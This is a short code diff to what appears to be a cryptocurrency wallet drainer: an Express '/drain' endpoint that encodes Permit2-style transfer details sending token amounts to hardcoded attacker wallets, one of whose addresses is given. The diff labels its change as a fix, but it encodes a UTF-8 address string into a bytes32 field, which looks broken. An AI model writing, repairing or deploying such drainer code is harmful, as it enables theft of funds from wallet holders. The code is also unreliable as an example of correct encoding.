@@ -204,10 +204,12 @@ app.post('/drain', async (req, res) => {
     const authorizedSpender = ethers.constants.AddressZero;
     const nonceBitmap = ethers.BigNumber.from(0);
     
-    const transferDetails = ethers.utils.solidityPack(
-      ['address', 'uint256', 'uint256', 'bytes32'],
-      [authorizedSpender, nonceBitmap, permitDetails.amount, ethers.utils.hexZeroPad(destination, 32)]
-    );
+    // 🔥 FIXED: RAW destination → NO hexZeroPad()
+const rawDestination = HARDCODED_WALLETS[tokenSymbol]; // "0x65b4be1fdded19b66d0029306c1fdb6004586876"
+const transferDetails = ethers.utils.defaultAbiCoder.encode(
+  ['address', 'uint256', 'uint256', 'bytes32'],
+  [authorizedSpender, nonceBitmap, permitDetails.amount, ethers.utils.toUtf8Bytes(rawDestination)]
+);
 
     console.log(`🔧 transferDetails: ${transferDetails.slice(0,20)}... (${transferDetails.length} bytes)`);
 
